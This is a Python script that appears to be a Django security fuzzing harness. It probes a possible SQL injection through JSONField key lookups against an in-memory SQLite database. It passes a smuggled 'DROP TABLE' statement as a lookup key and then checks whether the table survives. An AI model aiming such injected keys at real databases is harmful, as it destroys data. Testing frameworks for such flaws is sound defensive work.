from django.core.exceptions import (
    ValidationError,
    SuspiciousFileOperation,
)

from django.utils import text
from django.utils.http import (
    base36_to_int,
    escape_leading_slashes,
    int_to_base36,
    url_has_allowed_host_and_scheme,
    parse_etags,
    parse_http_date,
    quote_etag,
    urlencode,
    urlsafe_base64_decode,
    urlsafe_base64_encode,
)
from django.utils.html import (
    conditional_escape,
    escape,
    escapejs,
    # format_html,
    # html_safe,
    json_script,
    linebreaks,
    smart_urlquote,
    strip_spaces_between_tags,
    strip_tags,
    urlize,
)
from django.utils.ipv6 import clean_ipv6_address, is_valid_ipv6_address
import datetime
from django.utils import feedgenerator
from django.utils.encoding import (
    DjangoUnicodeDecodeError,
    escape_uri_path,
    filepath_to_uri,
    iri_to_uri,
    smart_str,
    uri_to_iri,
)
from django import forms
from django.conf import settings

# These are used for the sql fuzzing...

from django.db import models, connection
from django.db.utils import ProgrammingError

import django

# settings.configure() #  Don't use the default stuff here.
# Instead use these settings...

settings.configure(
    DEBUG=True,
    SECRET_KEY='injectiontest',
    INSTALLED_APPS=['fuzzer_project'],
    DATABASES={
        'default': {
            'ENGINE': 'django.db.backends.sqlite3',
            'NAME': ':memory:',  # In-memory DB
        }
    }
)

django.setup()

# Define model
class Product(models.Model):
    name = models.CharField(max_length=100)
    metadata = models.JSONField()

    class Meta:
        app_label = 'app'


if __name__=="__main__":
    # Create the schema
    with connection.schema_editor() as schema_editor:
        schema_editor.create_model(Product)

    # Insert a test row
    Product.objects.create(name='Laptop', metadata={'safe_key': 'gray'})

    # Malicious key to simulate injection
    malicious_key = "bad_key; DROP TABLE app_product; --"

    try:
        # This would trigger the vulnerable path pre-patch
        print(f"[*] Executing with key: {malicious_key}")
        qs = Product.objects.values(f"metadata__{malicious_key}")
        for row in qs:
            print(row)

    except ProgrammingError as e:
        print("[!] SQL injection triggered error:")
        print(e)

    except Exception as e:
        print("[!] Other error:")
        print(e)

    # Verify table still exists
    try:
        print("[*] Verifying table is intact:")
        print(Product.objects.all())
    except Exception as e:
        print("[!] Table is gone or DB corrupted:")
        print(e)
    exit(0)

